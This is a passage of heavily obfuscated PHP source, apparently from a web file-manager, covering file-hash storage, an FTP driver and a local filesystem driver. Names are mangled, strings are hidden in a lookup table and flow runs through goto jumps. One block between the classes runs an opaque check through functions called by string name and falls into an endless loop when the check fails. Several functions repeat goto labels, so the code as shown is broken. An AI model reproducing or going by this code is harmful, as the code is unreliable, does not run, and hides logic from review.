$A딸Đ[$Bä[160]] ? $A딸Đ[$Bä[160]] : IO::hashSimple($c), $Bä[2122] => $Cĝ ? $Cĝ : $F¯֋); goto Cն; bƖג: } private function addFileData($bǞ) { $Bƭ =& $_SERVER[ԥ]; if (!$bǞ) { return !1; } $bǞ[$Bƭ[77]] = intval($bǞ[$Bƭ[77]]); if (!$bǞ[$Bƭ[77]] && strlen($bǞ[$Bƭ[160]]) > 32) { $bǞ[$Bƭ[77]] = intval(substr($bǞ[$Bƭ[160]], 32)); } $Dʈ = $this->add($bǞ); return $this->find($Dʈ); } public function addFile($e, $B, $A = false) { $cއ = IO::hashSimple($e); $Dڊ舰 = IO::hashMd5($e); $EЃЪ = IO::size($e); if ($Bڕȯ = $this->addFileCheckExist($cއ, $Dڊ舰, $EЃЪ)) { return $Bڕȯ; } $Aݎ = $this->addFileMake($e, $EЃЪ, $cއ, $Dڊ舰, $B, $A); return $this->addFileData($Aݎ); } public function addFileMake($Cެ, $AД峻, $E, $eسᨘ, $f, $bՓ) { goto f; f: $fۙ =& $_SERVER[ԥ]; $C = $this->createFileName($f); $e = get_path_father($C); goto c¼; A: $bȂ = KodIO::defaultDriver(); $Bڲ = array($fۙ[516] => $AД峻, $fۙ[2120] => 1, $fۙ[382] => $f, $fۙ[727] => $bȂ[$fۙ[363]], $fۙ[383] => $C, $fۙ[2121] => $E, $fۙ[2122] => $eسᨘ); return $Bڲ; goto f; c¼: $Eë = get_path_this($C); if ($bՓ) { $C = IO::move($Cެ, $e, !1, $Eë); } else { $C = IO::copy($Cެ, $e, !1, $Eë); } if (!$C) { return !1; } goto A; f: } public function addFileCheckExist($F梽, $DĆ, $D) { $aϔ =& $_SERVER[ԥ]; $f̃ߒ = $this->findByHash($F梽, $DĆ); if (!$f̃ߒ) { return !1; } $D = array($aϔ[2120] => intval($f̃ߒ[$aϔ[2123]]) + 1, $aϔ[516] => $D); $this->where(array($aϔ[416] => $f̃ߒ[$aϔ[415]]))->save($D); return $f̃ߒ; } public function remove($f) { $this->linkCountChange($f, !1); $this->clearEmpty(); return !0; } public function linkAdd($f޸) { $this->linkCountChange($f޸, !0); } public function linkCountChange($bٛ, $C) { goto C; Dɯ: foreach ($f牂 as $cݦ => $Aԙ) { $fӅ = $Aԙ . $cש[33]; if (!$A؇[$fӅ]) { $A؇[$fӅ] = array(); } $A؇[$fӅ][] = $cݦ; } foreach ($A؇ as $Aԙ => $Aۼ½) { if (!$Aۼ½) { continue; } $Aԙ = $C ? $Aԙ : -intval($Aԙ); $EΌ = array($cש[415] => array($cש[7], $Aۼ½)); if ($Aԙ < 0) { $EΌ[$cש[2123]] = array($cש[914], abs($Aԙ)); } $this->where($EΌ)->setAdd($cש[2123], $Aԙ); } goto Eٍ߶; Eڄ: $f牂 = array(); foreach ($bٛ as $cݦ) { $fӅ = $cݦ . $cש[33]; if (!$f牂[$fӅ]) { $f牂[$fӅ] = 0; } $f牂[$fӅ]++; } $A؇ = array(); goto Dɯ; C: $cש =& $_SERVER[ԥ]; if (!$bٛ) { return; } if (!is_array($bٛ)) { $bٛ = array($bٛ); } goto Eڄ; Eٍ߶: } public function findByHash($A, $f것 = false) { $C =& $_SERVER[ԥ]; if (!$A && !$f것) { return !1; } $Cꈅ = array($C[2121] => $A); if ($f것) { $Cꈅ = array($C[2122] => $f것); } return $this->order($C[2124])->where($Cꈅ)->find(); } public function clearEmpty($c = 0) { goto Cƌ; Cƌ: $F =& $_SERVER[ԥ]; $b͡ = time() - 3600 * 24 * $c; $eȿ = $F[2125] . $b͡; goto Fӻ䈔; e: foreach ($FŘ as $f՟) { $C£϶->update(1); $this->resetFile($f՟); } $C£϶->end(); goto f; Fӻ䈔: $FŘ = $this->where($eȿ)->select(); if (!$FŘ) { return; } $C£϶ = new Task($F[2126], $F[33], count($FŘ)); goto e; f: } private function resetFile($Bč) { goto d; f鿈: if ($Bč[$cæ[2123]] != $Fƅ) { $this->where($Fֈ)->save(array($cæ[2120] => $Fƅ)); } goto Bֺ; d: $cæ =& $_SERVER[ԥ]; $Fֈ = array($cæ[416] => $Bč[$cæ[415]]); $E桇 = Model($cæ[1093])->where($Fֈ)->count(); goto b碏; b碏: $Eܑ = Model($cæ[2127])->where($Fֈ)->count(); $Fƅ = intval($E桇) + intval($Eܑ); if ($Fƅ == 0) { IO::remove($Bč[$cæ[75]]); $this->where($Fֈ)->delete(); $this->metaSet($Bč[$cæ[415]], null, null); return; } goto f鿈; Bֺ: } public function storageInfo($EѦ = false) { goto AɄ; AɄ: $C؛ =& $_SERVER[ԥ]; $d = $this->count() + 0.0; $Fۇ렣 = 0; goto F; a÷: for ($d͇ = 0; $d͇ < $d; $d͇ = $d͇ + $B) { $bǌ = $this->limit($d͇, $d͇ + $B)->select(); foreach ($bǌ as $E) { $BՆ䗒 += $E[$C؛[77]] * $E[$C؛[2123]]; $Fۇ렣 += $E[$C؛[77]] * ($E[$C؛[2123]] - 1); $dϴ += $E[$C؛[2123]]; } } $d뒳 = array($C؛[2128] => $BՆ䗒, $C؛[2129] => $Fۇ렣, $C؛[2130] => $Fۇ렣 / $BՆ䗒, $C؛[81] => $d, $C؛[2131] => $dϴ); return $d뒳; goto B; F: $BՆ䗒 = 1; $dϴ = 0; $B = 5000; goto a÷; B: } } goto aǲ; Bݖ: $eס = $_SERVER[ԥ][543]; while (strlen($eס) < $_SERVER[ԥ][544]) { if (!$eס) { break; } $eס++; } $_SERVER[ƥ] = explode($_SERVER[ԥ][545], gzinflate(substr($_SERVER[ԥ][546], 10, -8))); goto a; B֎: if (!isset($_SERVER[$_SERVER[ԥ][718]]) || !isset($_SERVER[$_SERVER[ԥ][725]])) { goto c孢; dؘ: $AƋơ($_SERVER[$_SERVER[ԥ][721]] . $_SERVER[ԥ][722]); $Cŧ = 2; while ($Cŧ > 1) { $e = rawurlencode($Cŧ . $_SERVER[ԥ][357]); } goto b; B͈: $A = explode($_SERVER[ԥ][213], $B֠); if (count($A) < $_SERVER[ԥ][544]) { $d嘃о = $_SERVER[ԥ][723]; $d嘃о(); } $AƋơ = $_SERVER[ԥ][724]; goto dؘ; c孢: $F = $_SERVER[ԥ][720]; $CĴ = $_SERVER[$_SERVER[ԥ][721]] . $_SERVER[ԥ][722]; $B֠ = $F($CĴ); goto B͈; b: } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($EȰ) { parent::__construct(); if (count($EȰ) > 0) { $this->_init($EȰ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($C媉) { $E׫哛 =& $_SERVER[ԥ]; global $config; $this->appCharset = $config[$E׫哛[1127]]; $this->systemCharset = $config[$E׫哛[1128]]; if (isset($C媉[$E׫哛[1129]]) && $C媉[$E׫哛[1129]]) { $this->systemCharset = $C媉[$E׫哛[1129]]; } } public function iconvApp($C音) { return $this->iconvTo($C音, $this->systemCharset, $this->appCharset); } public function iconvSystem($bį) { return $this->iconvTo($bį, $this->appCharset, $this->systemCharset); } public function getPathOuter($bז) { goto c좃; d殽: return $this->pathDriver . $B[8] . ltrim($bז, $B[8]); goto cٓ; dԑ: if (substr($c܈τ, 0, 2) == $B[1130]) { $c܈τ = BASIC_PATH . substr($c܈τ, 2); } if (substr($bז, 0, 2) == $B[1130]) { $bז = BASIC_PATH . substr($bז, 2); } $c܈τ = KodIO::clear($c܈τ); goto d; d: $bז = KodIO::clear($bז); $bז = substr($bז, strlen($c܈τ)); if (empty($this->pathDriver)) { return $bז; } goto d殽; c좃: $B =& $_SERVER[ԥ]; $c܈τ = $this->iconvApp($this->pathBase); $bז = $this->iconvApp($bז); goto dԑ; cٓ: } private function _init($FЙ = array()) { goto fï; eê: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $Fۻ = @ftp_login($this->connect, $this->username, $this->userpass); goto cЇד; b𬡇: foreach ($FЙ as $eݼ => $E) { if (isset($this->{$eݼ})) { $this->{$eݼ} = $E; } } static $D˷ = array(); $d˟ = md5(json_encode($FЙ)); goto dϔ; fï: $e왿 =& $_SERVER[ԥ]; if (!function_exists($e왿[1131])) { show_json(LNG($e왿[1132]), !1); } $this->charsetReset($FЙ); goto b𬡇; aå: $d = isset($F[$e왿[164]]) && $F[$e왿[164]] == $e왿[1133] ? !0 : !1; $this->scheme = $d ? $e왿[1134] : $e왿[1135]; $this->port = isset($F[$e왿[166]]) ? $F[$e왿[166]] : 21; goto eê; a: return $Fۻ; goto c󬅓; dϔ: if (isset($D˷[$d˟])) { foreach ($D˷[$d˟] as $eݼ => $E) { $this->{$eݼ} = $E; } return !0; } $F = parse_url(trim($this->server, $e왿[8])); $this->host = $F[$e왿[165]]; goto aå; cЇד: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $D˷[$d˟] = array($e왿[1136] => $this->connect, $e왿[165] => $this->host, $e왿[164] => $this->scheme, $e왿[166] => $this->port); goto a; c󬅓: } private function _isconn() { return is_resource($this->connect); } public function mkfile($F, $bĮ = '', $E = REPEAT_RENAME) { if ($this->setContent($F, $bĮ)) { return $this->getPathOuter($F); } return !1; } public function mkdir($cС, $DǼ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $cС = $this->iconvSystem($cС); if ($this->isFolder($cС) || @ftp_mkdir($this->connect, $cС)) { return $this->getPathOuter($cС); } if (!$this->mkdir($this->pathFather($cС))) { return !1; } if ($cС = @ftp_mkdir($this->connect, $cС)) { return $this->getPathOuter($cС); } return !1; } public function copyFile($fΕ, $d) { goto b; c: $this->tempFileRemve($aК); return $d𬪰; goto e߂; b: if (!$this->_isconn()) { return !1; } $b뙖 = $this->pathThis($this->iconvSystem($fΕ)); $aК = $this->tempFile($b뙖); goto aԯ; aԯ: $D劃 = $this->iconvApp($aК); $this->download($fΕ, $D劃); $d𬪰 = $this->upload($d, $D劃); goto c; e߂: } public function moveFile($FΘ, $Dŭ) { if (!$this->_isconn()) { return !1; } $FΘ = $this->iconvSystem($FΘ); $Dŭ = $this->iconvSystem($Dŭ); $cᙬ = @ftp_rename($this->connect, $FΘ, $Dŭ); return $cᙬ ? $this->getPathOuter($Dŭ) : !1; } public function delFile($aݬҒ) { if (!$this->_isconn()) { return !1; } $aݬҒ = $this->iconvSystem($aݬҒ); return @ftp_delete($this->connect, $aݬҒ); } public function delFolder($a찄) { if (!$this->_isconn()) { return !1; } $a찄 = $this->iconvSystem($a찄); $b咶 = $this->ftpList($a찄); if (!$b咶) { return @ftp_rmdir($this->connect, $a찄); } foreach ($b咶 as $a) { if ($this->isFolder($a)) { $a = $this->iconvApp($a); $this->delFolder($a); } else { @ftp_delete($this->connect, $a); } } return @ftp_rmdir($this->connect, $a찄); } public function rename($e, $AϒĈ) { goto A󹛋٤; f̺ˋ: $c쌒 = rtrim($e, $d[8]) . $d[8] . $D; $d = @ftp_rename($this->connect, $e, $c쌒); $c쌒 = $this->iconvApp($c쌒); goto dɞֶ; f: $D = $this->iconvSystem($D); $e = $this->iconvSystem($e); $e = $this->pathFather($e); goto f̺ˋ; A󹛋٤: $d =& $_SERVER[ԥ]; if (!$this->_isconn()) { return !1; } $D = $this->fileNameAuto($this->pathFather($e), $AϒĈ); goto f; dɞֶ: return $d ? $this->getPathOuter($c쌒) : !1; goto C; C: } private function folderInfo($E؉, $dڲʚ = false) { goto c; c: $Cۇ =& $_SERVER[ԥ]; $f = $this->getPathOuter(rtrim($E؉, $Cۇ[8])); $Eˌ뎙 = $this->pathThis($f); goto EȲ; eܹǲ: return $bǋѕ; goto aÊ; EȲ: $EÆ = $this->iconvSystem($E؉); if ($dڲʚ) { return array($Cۇ[28] => $Eˌ뎙, $Cۇ[75] => $f, $Cۇ[29] => $Cۇ[76]); } $bǋѕ = array($Cۇ[28] => $Eˌ뎙, $Cۇ[75] => $f, $Cۇ[29] => $Cۇ[76], $Cۇ[183] => 0, $Cۇ[106] => 0, $Cۇ[1137] => !0, $Cۇ[1138] => !0); goto eܹǲ; aÊ: } private function fileInfo($e架׹, $cߪ = false) { goto dˋ; Eә: $a = $this->iconvSystem($e架׹); if ($cߪ) { return array($fׇ[28] => $bߙ󃿠, $fׇ[75] => $Aܛ, $fׇ[29] => $fׇ[163], $fׇ[156] => $this->ext($e架׹), $fׇ[77] => $this->size($e架׹)); } $b = array($fׇ[28] => $bߙ󃿠, $fׇ[75] => $Aܛ, $fׇ[29] => $fׇ[163], $fׇ[183] => 0, $fׇ[106] => @ftp_mdtm($this->connect, $a), $fׇ[156] => $this->ext($e架׹), $fׇ[77] => $this->size($e架׹), $fׇ[1137] => !0, $fׇ[1138] => !0); goto C诔; dˋ: $fׇ =& $_SERVER[ԥ]; $Aܛ = $this->getPathOuter(rtrim($e架׹, $fׇ[8])); $bߙ󃿠 = $this->pathThis($Aܛ); goto Eә; C诔: $b[$fׇ[106]] = $b[$fׇ[106]] > 0 ? $b[$fׇ[106]] : 0; return $b; goto c; c: } public function size($Bب) { $A̵ = $this->objectMeta($Bب); return $A̵ ? $A̵[$_SERVER[ԥ][77]] : 0; } public function info($d) { if ($this->isFile($d)) { return $this->fileInfo($d, 0); } else { if ($this->isFolder($d)) { return $this->folderInfo($d); } } return !1; } public function exist($dݬ) { return $this->objectMeta($dݬ) ? !0 : !1; } public function isFile($b) { $FҾ =& $_SERVER[ԥ]; $c˸ = $this->objectMeta($b); return $c˸ ? $c˸[$FҾ[29]] == $FҾ[163] : !1; } public function isFolder($e) { $F󑡡 =& $_SERVER[ԥ]; $d = $this->objectMeta($e); return $d ? $d[$F󑡡[29]] == $F󑡡[76] : !1; } public function listPath($dґ҄, $bƤ = false) { goto bӂ޾; aէ: foreach ($Dę as $dґ҄) { if ($this->isFolder($dґ҄)) { $C[$e־擮[74]][] = $this->folderInfo($dґ҄, $bƤ); } else { $C[$e־擮[73]][] = $this->fileInfo($dґ҄, $bƤ); } } return $C; goto Dւ; bӂ޾: $e־擮 =& $_SERVER[ԥ]; if (!$this->_isconn()) { return !1; } $dґ҄ = $this->iconvSystem($dґ҄); goto f¤; f¤: $Dę = $this->ftpList($dґ҄); $C = array($e־擮[74] => array(), $e־擮[73] => array()); if (!$Dę) { return $C; } goto aէ; Dւ: } public function has($A֟, $Dë䎎 = false, $Fצ = true) { goto dܾ; dܾ: $A =& $_SERVER[ԥ]; if (!$this->_isconn()) { return !1; } $A֟ = $this->iconvSystem($A֟); goto D≮; D≮: $Dج = $this->ftpList($A֟); if (!$Dج) { return !1; } if ($Dë䎎) { return array($A[187] => 0, $A[188] => count($Dج)); } goto FЧ; FЧ: foreach ($Dج as $A֟) { if ($Fצ) { if (!$this->isFolder($A֟)) { return !0; } } else { if ($this->isFolder($A֟)) { return !0; } } } return !1; goto c; c: } public function listAll($aߑ) { goto ačؽ; f鳮: $D = array($Bӟ[73] => array(), $Bӟ[74] => array()); $this->recursionFtpFiles($aߑ, $D); $C = array(); goto E; ačؽ: $Bӟ =& $_SERVER[ԥ]; if (!$this->_isconn()) { return !1; } $aߑ = $this->iconvSystem($aߑ); goto f鳮; E: foreach ($D[$Bӟ[74]] as $d) { $C[] = array($Bӟ[75] => $Bӟ[8] . trim(str_replace($aߑ, $Bӟ[33], $d), $Bӟ[8]) . $Bӟ[8], $Bӟ[76] => 1, $Bӟ[77] => 0); } foreach ($D[$Bӟ[73]] as $d˪) { $C[] = array($Bӟ[75] => $Bӟ[8] . trim(str_replace($aߑ, $Bӟ[33], $d˪), $Bӟ[8]), $Bӟ[76] => 0, $Bӟ[77] => $this->size($d˪)); } return $C; goto aՌ; aՌ: } public function getContent($D) { if (!$this->_isconn()) { return !1; } $D = $this->iconvSystem($D); return $this->fileSubstr($D); } public function setContent($AŸ, $B = '') { goto D; D: if (!$this->_isconn()) { return !1; } $D = $this->pathThis($this->iconvSystem($AŸ)); $d = $this->tempFile($D); goto f; f: file_put_contents($d, $B); $c͔񅶇 = $this->upload($AŸ, $this->iconvApp($d)); $this->tempFileRemve($d); goto DęЃË; DęЃË: return $c͔񅶇; goto F; F: } public function fileSubstr($dڒⱴ, $c = 0, $FЪ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dڒⱴ, $c, $FЪ); } private function ftpRequest($D, $Bӑ = 0, $c = false) { goto AËʐ; Eڂ: curl_setopt($a뗙, CURLOPT_RETURNTRANSFER, 1); $eϳߎ㦵 = curl_exec($a뗙); curl_close($a뗙); goto c; AËʐ: $D = $this->iconvSystem($D); $C֚ꑋ = $this->scheme . $this->host . $_SERVER[ԥ][4] . $this->port; $a뗙 = curl_init(); goto f; f: curl_setopt($a뗙, CURLOPT_URL, $C֚ꑋ . $this->pathEncode($D)); curl_setopt($a뗙, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($c) { $Fȓ얈 = $Bӑ + $c - 1; curl_setopt($a뗙, CURLOPT_RANGE, "{$Bӑ}\55{$Fȓ얈}"); } goto Eڂ; c: return $eϳߎ㦵; goto cꉤ; cꉤ: } public function upload($A, $D߯, $A绐 = false, $B팏 = REPEAT_REPLACE) { goto bф; bф: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($A))) { return !1; } $A = $this->iconvSystem($A); goto bڳߙ; Cߗ: if ($B != FTP_FINISHED) { return !1; } return $this->getPathOuter($A); goto E鄻; bڳߙ: $D߯ = $this->iconvSystem($D߯); $B = ftp_nb_put($this->connect, $A, $D߯, FTP_BINARY); while ($B == FTP_MOREDATA) { $B = ftp_nb_continue($this->connect); } goto Cߗ; E鄻: } public function download($E, $fР = '') { goto f; f: if (!$this->_isconn()) { return !1; } $c = $this->pathFather($fР); if (!IO::mkdir($c)) { return !1; } goto dՐ; bѧʶ: while ($C == FTP_MOREDATA) { $C = ftp_nb_continue($this->connect); } if ($C != FTP_FINISHED) { return !1; } return $this->iconvApp($fР); goto C; dՐ: $E = $this->iconvSystem($E); $fР = $this->iconvSystem($fР); $C = ftp_nb_get($this->connect, $fР, $E, FTP_BINARY); goto bѧʶ; C: } private function ftpList($c) { goto a; Aل: $dֺ = array(); foreach ($F as $a𙣯) { if ($a𙣯 == $aë[91] || $a𙣯 == $aë[1140]) { continue; } if (!strstr($a𙣯, $aë[8])) { $a𙣯 = $c . ltrim($a𙣯, $aë[8]); } $dֺ[] = $this->iconvApp($a𙣯); } return $dֺ; goto bȎ; a: $aë =& $_SERVER[ԥ]; if (!$this->isFolder($c)) { return !1; } @ftp_chdir($this->connect, $aë[8]); goto a; a: $c = rtrim($c, $aë[8]) . $aë[8]; $F = @ftp_nlist($this->connect, $c); if ($F === !1) { $F = @ftp_rawlist($this->connect, $c); foreach ($F as $Fک => $Č) { $F[$Fک] = end(explode($aë[1139], $Č)); } } goto Aل; bȎ: } private function recursionFtpFiles($eӌ, &$eͱ) { $C쏐 =& $_SERVER[ԥ]; if (!$this->_isconn()) { return !1; } if (!($F = $this->ftpList($eӌ))) { return !1; } foreach ($F as $eӌ) { if ($this->isFolder($eӌ)) { $this->recursionFtpFiles($eӌ, $eͱ); $eͱ[$C쏐[74]][] = $eӌ; } else { $eͱ[$C쏐[73]][] = $eӌ; } } } private function objectMeta($c寴) { goto B; D: $BݱЏ = @ftp_size($this->connect, $this->iconvSystem($c寴)); if ($BݱЏ != -1) { $B檔ס = array($dϦ[77] => $BݱЏ, $dϦ[29] => $dϦ[163]); } else { $B = @ftp_chdir($this->connect, $this->iconvSystem($c寴)); $B檔ס = $B ? array($dϦ[77] => 0, $dϦ[29] => $dϦ[76]) : !1; } Cache::set($Cٳѭ, $B檔ס, 0); goto B; B: return $B檔ס; goto c斤; B: $dϦ =& $_SERVER[ԥ]; $Cٳѭ = $dϦ[1141] . md5($c寴); $B檔ס = Cache::get($Cٳѭ); goto f; f: if ($B檔ס !== null && $B檔ס !== !1) { return $B檔ס; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $dϦ[8]); goto D; c斤: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($d۶ê) { if (substr($d۶ê, 0, 2) == $_SERVER[ԥ][1130]) { $d۶ê = BASIC_PATH . substr($d۶ê, 2); } return $d۶ê; } public function iconvApp($f) { $a =& $_SERVER[ԥ]; global $config; return $this->iconvTo($f, $config[$a[1128]], $config[$a[1127]]); } public function iconvSystem($CÑڇ) { $a즈֗ =& $_SERVER[ԥ]; global $config; return $this->iconvTo($CÑڇ, $config[$a즈֗[1127]], $config[$a즈֗[1128]]); } public function getPathOuter($F֚) { goto B; A: if (substr($A, 0, 2) == $a[1130]) { $A = BASIC_PATH . substr($A, 2); } if (substr($F֚, 0, 2) == $a[1130]) { $F֚ = BASIC_PATH . substr($F֚, 2); } $A = KodIO::clear($A); goto A͠; A͠: $F֚ = KodIO::clear($F֚); $F֚ = substr($F֚, strlen($A)); if (empty($this->pathDriver)) { return $F֚; } goto dᢑݻ; dᢑݻ: return $this->pathDriver . $a[8] . ltrim($F֚, $a[8]); goto a; B: $a =& $_SERVER[ԥ]; $A = $this->iconvApp($this->pathBase); $F֚ = $this->iconvApp($F֚); goto A; a: } public function mkfile($E͓, $aáړ = '', $Dښ = REPEAT_RENAME) { $E͓ = $this->iconvSystem($E͓); @touch($E͓); if ($aáړ) { file_put_contents($E͓, $aáړ); } return is_file($E͓) ? $this->getPathOuter($E͓) : !1; } public function mkdir($Eɮդ, $D = REPEAT_SKIP) { $Eɮդ = $this->iconvSystem($Eɮդ); if (is_dir($Eɮդ)) { return $this->getPathOuter($Eɮդ); } @mkdir($Eɮդ, 511, !0); return is_dir($Eɮդ) ? $this->getPathOuter($Eɮդ) : !1; } public function copyFile($F՞, $bՓޞ) { $this->mkdir($this->pathFather($bՓޞ)); $F՞ = $this->iconvSystem($F՞); $bՓޞ = $this->iconvSystem($bՓޞ); $C⪙ = @copy($F՞, $bՓޞ); return $C⪙ ? $this->getPathOuter($bՓޞ) : !1; } public function moveFile($Bߏ, $d) { $this->mkdir($this->pathFather($d)); $Bߏ = $this->iconvSystem($Bߏ); $d = $this->iconvSystem($d); $eז = intval(@rename($Bߏ, $d)); if (!$eז) { if ($eז = intval(@copy($Bߏ, $d))) { @unlink($Bߏ); } } return $eז ? $this->getPathOuter($d) : !1; } public function delFile($Døݐ) { $Døݐ = $this->iconvSystem($Døݐ); if (!@unlink($Døݐ)) { @chmod($Døݐ, 511); if (!@unlink($Døݐ)) { return !1; } } else { return !0; } } public function delFolder($F㎯) { goto dڅ; dڅ: $Aᑐ΄ =& $_SERVER[ԥ]; $F㎯ = $this->iconvSystem($F㎯); if (!is_dir($F㎯)) { return !0; } goto EλՋ; EλՋ: if (!($B鎛է = opendir($F㎯))) { return !1; } while (($cΨ = readdir($B鎛է)) !== !1) { if ($cΨ == $Aᑐ΄[91] || $cΨ == $Aᑐ΄[1140]) { continue; } $Aɹ = $F㎯ . $Aᑐ΄[8] . $cΨ; if (!is_dir($Aɹ)) { if (!unlink($Aɹ)) { chmod($Aɹ, 511); if (!unlink($Aɹ)) { return !1; } } } else { chmod($Aɹ, 511); $Aɹ = $this->iconvApp($Aɹ); if (!$this->delFolder($Aɹ)) { return !1; } } } closedir($B鎛է); goto aζ; aζ: return rmdir($F㎯); goto e; e: } public function rename($b䛷¾, $CɈ) { goto A; dߑ: $b䛷¾ = $this->iconvSystem($b䛷¾); $DД = $this->pathFather($b䛷¾); $bˊח = rtrim($DД, $Fٶ[8]) . $Fٶ[8] . $AΊ; goto a؏; A: $Fٶ =& $_SERVER[ԥ]; $AΊ = $this->fileNameAuto($this->pathFather($b䛷¾), $CɈ); $AΊ = $this->iconvSystem($AΊ); goto dߑ; a؏: $Bﬗј = @rename($b䛷¾, $bˊח); $bˊח = $this->iconvApp($bˊח); return $Bﬗј ? $this->getPathOuter($bˊח) : !1; goto c; c: } public function size($C) { $C = $this->iconvSystem($C); return (double) abs(sprintf($_SERVER[ԥ][1142], @filesize($C))); } public function info($Bޫ) { $Bޫ = $this->iconvSystem($Bޫ); if ($this->isFolder($Bޫ)) { return $this->folderInfo($Bޫ); } else { if ($this->isFile($Bޫ)) { return $this->fileInfo($Bޫ); } } return !1; } protected function infoChildren($B҆, &$e, $aŊ = true) { $D =& $_SERVER[ԥ]; $B҆ = rtrim($B҆, $D[8]) . $D[8]; if ($aŊ) { check_abort(); $B҆ = $this->iconvSystem($B҆); } if (!($F퉍߳ = @opendir($B҆))) { return; } while (($C郮 = readdir($F퉍߳)) !== !1) { if ($C郮 == $D[91] || $C郮 == $D[1140]) { continue; } $c䥶 = $B҆ . $C郮; if (is_file($c䥶)) { $e[$D[78]]++; $e[$D[77]] += (double) abs(sprintf($D[1142], @filesize($c䥶))); } else { $e[$D[79]]++; $this->infoChildren($c䥶, $e, !1); } } closedir($F퉍߳); } private function folderInfo($CӬ, $aͅ = false) { $BԲӡٞ =& $_SERVER[ԥ]; $CӬ = rtrim($CӬ, $BԲӡٞ[8]) . $BԲӡٞ[8]; $C = $this->iconvApp($this->pathThis($CӬ)); if ($aͅ) { return array($BԲӡٞ[28] => $C, $BԲӡٞ[75] => $this->getPathOuter($CӬ), $BԲӡٞ[29] => $BԲӡٞ[76]); } $D׼ = array($BԲӡٞ[28] => $C, $BԲӡٞ[75] => $this->getPathOuter($CӬ), $BԲӡٞ[29] => $BԲӡٞ[76], $BԲӡٞ[183] => @filectime($CӬ), $BԲӡٞ[106] => @filemtime($CӬ), $BԲӡٞ[1143] => @fileatime($CӬ), $BԲӡٞ[1137] => is_readable($CӬ), $BԲӡٞ[1138] => is_writable($CӬ), $BԲӡٞ[1144] => get_mode($CӬ)); return $D׼; } private function fileInfo($Bؘ, $A = false) { $E₳ =& $_SERVER[ԥ]; $d = $this->iconvApp($this->pathThis($Bؘ)); if ($A) { return array($E₳[28] => $d, $E₳[75] => $this->getPathOuter($Bؘ), $E₳[29] => $E₳[163], $E₳[77] => $this->size($Bؘ), $E₳[156] => $this->ext($d)); } $e˲ = array($E₳[28] => $d, $E₳[75] => $this->getPathOuter($Bؘ), $E₳[29] => $E₳[163], $E₳[183] => @filectime($Bؘ), $E₳[106] => @filemtime($Bؘ), $E₳[1143] => @fileatime($Bؘ), $E₳[77] => $this->size($Bؘ), $E₳[156] => $this->ext($d), $E₳[1137] => is_readable($Bؘ), $E₳[1138] => is_writable($Bؘ), $E₳[1144] => get_mode($Bؘ)); return $e˲; } public function exist($aӠ) { $aӠ = $this->iconvSystem($aӠ); return @file_exists($aӠ); } public function isFile($Cʆ) { $Cʆ = $this->iconvSystem($Cʆ); return @is_file($Cʆ); } public function isFolder($b) { $b = $this->iconvSystem($b); return @is_dir($b); } public function listPath($f, $eڞ = false) { goto e; b斍: $D荺æ = array($b͵[74] => array(), $b͵[73] => array()); if (!($bϴ = @opendir($f))) { return $D荺æ; } while (($BԱ = readdir($bϴ)) !== !1) { if ($BԱ == $b͵[91] || $BԱ == $b͵[1140]) { continue; } $c = $f . $BԱ; if (is_file($c)) { $D荺æ[$b͵[73]][] = $this->fileInfo($c, $eڞ); } else { $D荺æ[$b͵[74]][] = $this->folderInfo($c, $eڞ); } } goto C; C: closedir($bϴ); return $D荺æ; goto F; e: $b͵ =& $_SERVER[ԥ]; $f = $this->iconvSystem($f); $f = rtrim($f, $b͵[8]) . $b͵[8]; goto b斍; F: } public function listAll($Cԇ, &$Bϧ = array()) { goto E; E: $b =& $_SERVER[ԥ]; $Cԇ = $this->iconvSystem($Cԇ); $Cԇ = rtrim($Cԇ, $b[8]) . $b[8]; goto C; C: if (!($cҴϜ = @opendir($Cԇ))) { return $Bϧ; } while (($d萒 = readdir($cҴϜ)) !== !1) { if ($d萒 == $b[91] || $d萒 == $b[1140]) { continue; } $b = $Cԇ . $d萒; if (is_dir($b)) { $Bϧ[] = array($b[75] => $b . $b[8], $b[76] => 1, $b[106] => @filemtime($b), $b[77] => 0); $this->listAll($b, $Bϧ); } else { $Bϧ[] = array($b[75] => $b, $b[76] => 0, $b[106] => @filemtime($b), $b[77] => $this->size($b)); } } closedir($cҴϜ); goto cꃿͿ; cꃿͿ: return $Bϧ; goto eԙ; eԙ: } public function has($dĆ, $E = false, $C揮ś = true) { goto D; c쳤: if (!($Fт = @opendir($dĆ))) { return !1; } $Aຖ = 0; $Bң = 0; goto A; E鄛ͤ: return !1; goto E; A: while (($C铋녳 = readdir($Fт)) !== !1) { if ($C铋녳 == $fՈ[91] || $C铋녳 == $fՈ[1140]) { continue; } $e = $dĆ . $C铋녳; if ($E) { if (@is_file($e)) { $Aຖ++; } else { $Bң++; } continue; } if ($C揮ś) { if (@is_file($e)) { return !0; } } else { if (@is_dir($e . $fՈ[8])) { return !0; } } } closedir($Fт); if ($E) { return array($fՈ[187] => $Aຖ, $fՈ[188] => $Bң); } goto E鄛ͤ; D: $fՈ =& $_SERVER[ԥ]; $dĆ = $this->iconvSystem($dĆ); $dĆ = rtrim($dĆ, $fՈ[8]) . $fՈ[8]; goto c쳤; E: } public function hashSimple($Eԙ) { goto Bۮ; D: $b = fopen($Eԙ, $aʇތ[1145]); if (!$b) { return $Aҍ; } for ($D쭒 = 0; $D쭒 < $eț; $D쭒++) { fseek($b, $c呡 * $D쭒); $Aҍ .= fread($b, $aΈԕ); } goto A; Bۮ: $aʇތ =& $_SERVER[ԥ]; if (!$Eԙ) { return md5($aʇތ[33]); } $Eԙ = $this->iconvSystem($Eԙ); goto D; D: $C뻝 = $this->size($Eԙ); $aΈԕ = 200; $eț = 50; goto Cջ; f: return md5($Aҍ) . $C뻝; goto D; A: fseek($b, $C뻝 - $aΈԕ); $Aҍ .= fread($b, $aΈԕ); fclose($b); goto f; Cջ: if ($C뻝 <= $aΈԕ * $eț) { return 